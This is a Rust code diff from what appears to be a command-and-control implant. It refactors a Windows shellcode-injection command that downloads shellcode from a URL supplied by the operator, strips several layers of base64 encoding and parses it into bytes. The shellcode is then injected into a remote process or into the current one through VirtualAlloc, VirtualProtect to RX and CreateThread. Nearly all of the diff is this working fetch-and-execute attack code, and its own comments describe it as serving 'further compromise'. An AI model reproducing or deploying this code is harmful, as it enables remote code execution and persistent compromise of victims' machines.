@@ -22,6 +22,78 @@ use crate::cmd::CommandArgs;
 #[cfg(windows)] use std::ptr;
 #[cfg(windows)] use reqwest::Client;
 
+/// Handles the retrieval and deobfuscation of shellcode from a url.
+#[cfg(windows)]
+async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, &str> {
+    // Download shellcode, or try to
+    let client = Client::new();
+    if let Ok(r) = client.get(url).send().await {
+        if r.status().is_success() {   
+            logger.info(format!("Got the shellcode")); 
+            // Get the shellcode. Now we have to decode it
+            let mut shellcode_encoded: Vec<u8>;
+            let mut shellcode_string: String;
+            let mut shellcode: Vec<u8>;
+            if let Ok(sc) = r.text().await {
+                shellcode_encoded = Vec::from(sc.trim().as_bytes());
+                logger.info(format!("Got encoded bytes"));
+                for i in 0..b64_iterations {
+                    logger.debug(format!("Decode iteration: {i}"));
+                    match b64_decode(shellcode_encoded) {
+                        Ok(d) => {
+                            shellcode_encoded = d
+                                .into_iter()
+                                .filter(|&b| b != 0x0a)
+                                .collect();
+                        },
+                        Err(e) => { 
+                            let err_msg = e.to_string();
+                            logger.err(format!("{}", err_msg.to_owned()));
+                            return Err("Could not decode shellcode"); 
+                        }
+                    };
+                    
+                }
+                // Convert bytes to our proper string
+                if let Ok(s) = String::from_utf8(shellcode_encoded) {
+                    shellcode_string = s;
+                } else {
+                    let err_msg = "Could not convert shellcode bytes to string";
+                    logger.err(err_msg.to_string());
+                    return Err("Could not convert shellcode bytes to string");
+                }
+                // At this point, we have the comma-separated "0xNN" form of the shellcode.
+                // We need to get each one until a proper u8.
+                shellcode = shellcode_string
+                    .split(",")
+                    .map(|s| s.replace("0x", ""))
+                    .map(|s| s.replace(" ", ""))                    
+                    .map(|s|{ 
+                        match u8::from_str_radix(&s, 16) {
+                            Ok(b) => b,
+                            Err(_) => 0
+                        }
+                    })
+                    .collect();
+                
+                // The actual success
+                return Ok(shellcode);
+
+            } else {
+                let err_msg = "Could not decode shellcode";
+                logger.err(err_msg.to_string());
+                return Err(err_msg);
+            }
+
+        } else {
+            return Err("Could not download shellcode");
+        }   
+
+    } else {
+        return Err("Could not download shellcode");
+    }
+} 
+
 /// Shellcode-based attacks for further compromise.
 /// 
 /// On Windows, this will attempt process injection.
@@ -45,7 +117,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
         // Set up our variables; each one could fail on us.
         // Yes this is a lot of verbose error checking, but this
         // has to be rock solid or the agent will die.
-        let mut url: &str;
+        let mut url: String;
         let mut b64_iterations: u32;
 
         // Get URL
@@ -69,63 +141,16 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
             None => { return Ok("Could not extract b64 iterations".to_string()); }
         };
 
-        // Download shellcode, or try to
-        let client = Client::new();
-        if let Ok(r) = client.get(url).send().await {
-            if r.status().is_success() {   
-                logger.info(format!("Got the shellcode")); 
-                // Get the shellcode. Now we have to decode it
-                let mut shellcode_encoded: Vec<u8>;
-                let mut shellcode_string: String;
-                let mut shellcode: Vec<u8>;
-                if let Ok(sc) = r.text().await {
-                    shellcode_encoded = Vec::from(sc.trim().as_bytes());
-                    logger.info(format!("Got encoded bytes"));
-                    for i in 0..b64_iterations {
-                        logger.debug(format!("Decode iteration: {i}"));
-                        match b64_decode(shellcode_encoded) {
-                            Ok(d) => {
-                                shellcode_encoded = d
-                                    .into_iter()
-                                    .filter(|&b| b != 0x0a)
-                                    .collect();
-                            },
-                            Err(e) => { return Ok(e.to_string()); }
-                        };
-                        
-                    }
-                    // Convert bytes to our proper string
-                    shellcode_string = String::from_utf8(shellcode_encoded)?;
-                    // At this point, we have the comma-separated "0xNN" form of the shellcode.
-                    // We need to get each one until a proper u8.
-                    shellcode = shellcode_string
-                        .split(",")
-                        .map(|s| s.replace("0x", ""))
-                        .map(|s| s.replace(" ", ""))                    
-                        .map(|s|{ 
-                            match u8::from_str_radix(&s, 16) {
-                                Ok(b) => b,
-                                Err(_) => 0
-                            }
-                        })
-                        .collect();
-
-                } else {
-                    let err_msg = "Could not decode shellcode";
-                    logger.err(err_msg.to_string());
-                    return Ok(err_msg.to_string());
-                }
-
-            } else {
-                return Ok("Could not download shellcode".to_string());
-            }   
-
-        } else {
-            return Ok(format!("Could not download from {url}"));
-        }
+        // CALL get_shellcode
 
         match inject_type.as_str() {
             "remote" => {
+                // Get shellcode
+                let mut shellcode: Vec<u8>; 
+                match get_shellcode(url, b64_iterations, logger).await {
+                    Ok(s) => { shellcode = s},
+                    Err(e) => { return Ok(e.to_string()); }
+                };
                 let mut pid: u32;
                 // Get pid
                 match cmd_args.nth(0) {
@@ -159,6 +184,14 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
             },
             "self"  => {
                 type DWORD = u32;
+
+                // Get shellcode
+                let mut shellcode: Vec<u8>; 
+                match get_shellcode(url, b64_iterations, logger).await {
+                    Ok(s) => { shellcode = s},
+                    Err(e) => { return Ok(e.to_string()) }
+                };
+
                 logger.debug(format!("Injecting into current process..."));
                 unsafe {
                     let base_addr = kernel32::VirtualAlloc(
@@ -169,18 +202,18 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     );
 
                     if base_addr.is_null() {
-                        println!("[-] Couldn't allocate memory to current proc.")
+                        logger.err("Couldn't allocate memory to current proc.".to_string())
                     } else {
-                        println!("[+] Allocated memory to current proc.");
+                        logger.debug("Allocated memory to current proc.".to_string());
                     }
 
                     // copy shellcode into mem
-                    println!("[*] Copying Shellcode to address in current proc.");
+                    logger.debug("Copying Shellcode to address in current proc.".to_string());
                     std::ptr::copy(shellcode.as_ptr() as _, base_addr, shellcode.len());
-                    println!("[*] Copied...");
+                    logger.debug("Copied...".to_string());
 
                     // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
-                    println!("[*] Changing mem protections to RX...");
+                    logger.debug("Changing mem protections to RX...".to_string());
 
                     let mut old_protect: DWORD = PAGE_READWRITE;
 
@@ -193,13 +226,11 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
 
                     if mem_protect == 0 {
                         let error = errhandlingapi::GetLastError();
-                        println!("[-] Error: {}", error.to_string());
-                        process::exit(0x0100);
+                        return Ok(format!("Error: {error}"));
                     }
 
                     // Call CreateThread
-
-                    println!("[*] Calling CreateThread...");
+                    logger.debug("Calling CreateThread...".to_string());
 
                     let mut tid = 0;
                     let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
@@ -215,27 +246,27 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
 
                     if h_thread.is_null() {
                         let error = unsafe { errhandlingapi::GetLastError() };
-                        println!("{}", error.to_string())
+                        logger.err(format!("{error}"));
                     } else {
-                        println!("[+] Thread Id: {}", tid)
+                        logger.info(format!("Thread Id: {tid}"));
                     }
 
                     // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running
-
-                    println!("[*] Calling WaitForSingleObject...");
+                    logger.debug("Calling WaitForSingleObject...".to_string());
 
                     let status = WaitForSingleObject(h_thread, winbase::INFINITE);
                     if status == 0 {
-                        println!("[+] Good!")
+                        logger.info("Good!".to_string())
                     } else {
                         let error = errhandlingapi::GetLastError();
-                        println!("{}", error.to_string())
+                        logger.err(format!("{error}"));
                     }
                 }
 
                 return Ok("Injection completed!".to_string());
                 
-            }
+            },
+            _ => Ok("Unknown injection type!".to_string())
         }
 
     } else {
@@ -246,6 +277,6 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
 }
 
 #[cfg(not(windows))]
-pub async fn handle(cmd_args: &CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
+pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
     Ok("Can only inject shellcode on Windows!".to_string())   
 }
